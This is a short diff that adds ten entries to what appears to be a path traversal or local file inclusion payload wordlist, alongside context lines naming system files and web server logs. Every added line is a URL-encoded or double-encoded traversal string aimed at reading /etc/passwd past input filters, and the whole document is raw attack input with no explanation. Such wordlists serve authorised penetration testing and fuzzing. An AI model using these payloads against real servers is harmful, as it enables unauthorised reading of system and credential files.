@@ -139,6 +139,16 @@ proc/self/environ%00
 /etc/security/user
 /etc/security/environ
 /etc/security/limits
+..%2fetc%2fpasswd
+..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+%252e%252e/etc/passwd
+%252e%252e/%252e%252e/etc/passwd
+%252e%252e/%252e%252e/%252e%252e/etc/passwd
 /usr/lib/security/mkuser.default
 /apache/logs/access.log
 /apache/logs/error.log
